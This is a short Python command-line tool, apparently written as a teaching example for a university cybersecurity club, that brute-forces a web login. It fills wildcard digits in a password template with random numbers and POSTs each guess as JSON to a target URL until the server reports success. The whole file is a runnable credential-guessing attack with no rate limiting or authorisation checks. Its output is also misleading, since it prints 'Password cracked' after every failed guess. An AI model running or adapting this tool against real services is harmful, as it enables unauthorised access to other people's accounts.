import requests as req
import argparse
import random
from logo import showLogo
from time import sleep
from prettytable import PrettyTable

def generatePhone(template: str):
  rng = [str(random.randint(0, 9)) for _ in range(template.count("*"))]
  size = len(rng)

  for number in rng:
    template = template.replace("*", number, 1)

  return template, 10**size
  
def argumentParser():
  parser = argparse.ArgumentParser(description="Bruteforce example for MSU Cybersecurity Club")

  parser.add_argument(
    "-m",
    "--method",
    choices=["GET", "POST"],
    default="GET",
    type=str,
    help="HTTP method to use"
  )

  parser.add_argument(
    "-u",
    "--username",
    type=str,
    help="Username or email or either"
  )

  parser.add_argument(
    "-p",
    "--password",
    type=str,
    help="Password to bruteforce Ex.0987***21, 0-9 will replace to (*)"
  )

  parser.add_argument(
    "url",
    metavar="URL",
    type=str,
    help="Target url to bruteforce"
  )

  return parser.parse_args()

def main():
  showLogo()
  argument = argumentParser()
  print("Please waiting...")
  sleep(3)
  argUrl: str  = argument.url
  argMethod: str = argument.method
  argUsername: str = argument.username
  argPassword: str = argument.password

  if argMethod.lower() == "get":
    try:
      res = req.get(argUrl)
      print(res.json())
    except req.exceptions.MissingSchema:
      print("It isn't URL!!")
    except req.exceptions.JSONDecodeError:
      print("Support only JSON response")

  if argMethod.lower() == "post":
    memo = []
    count = 1

    try:
      while True:
        password, size = generatePhone(argPassword)

        if count > size:
          print("These password aren't correct")
          break

        if password in memo:
          continue

        jBody = {"username": argUsername, "password": password}
        res = req.post(argUrl, json=jBody)
        
        if int(res.json()["status"]) == 200:
          p = PrettyTable(["Correct Password"])
          p.add_row([password])
          
          print(p)
          break
        
        print(f"Password cracked: {password}", f"Attempted: {count}")
        memo.append(password)
        count += 1

    except req.exceptions.MissingSchema:
      print("It isn't URL!!")
    except req.exceptions.JSONDecodeError:
      print("Support only JSON response")

if __name__ == "__main__":
  main()